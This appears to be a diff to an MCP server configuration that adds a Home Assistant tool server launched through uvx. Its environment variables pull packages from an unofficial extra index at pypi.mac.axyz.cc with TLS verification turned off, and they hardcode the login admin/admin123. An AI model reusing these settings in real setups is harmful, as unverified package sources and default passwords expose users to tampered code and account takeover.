@@ -7,6 +7,23 @@
                 "Authorization": "Bearer <your-access-token>"
             },
             "enabled": true
+        },
+        "home_assistant": {
+            "transport": "stdio",
+            "command": "uvx",
+            "args": [
+                "home-assistant-mcp"
+            ],
+            "env": {
+                "UV_INSECURE_HOST": "pypi.mac.axyz.cc",
+                "UV_EXTRA_INDEX_URL": "https://pypi.mac.axyz.cc:30923",
+                "UV_LINK_MODE": "copy",
+                "HOME_ASSISTANT_USERNAME": "admin",
+                "HOME_ASSISTANT_PASSWORD": "admin123",
+                "HOME_ASSISTANT_URL": "http://127.0.0.1:8123",
+                "HOME_ASSISTANT_CACHE_DIR": "./.cache"
+            },
+            "enabled": true
         }
     }
 }
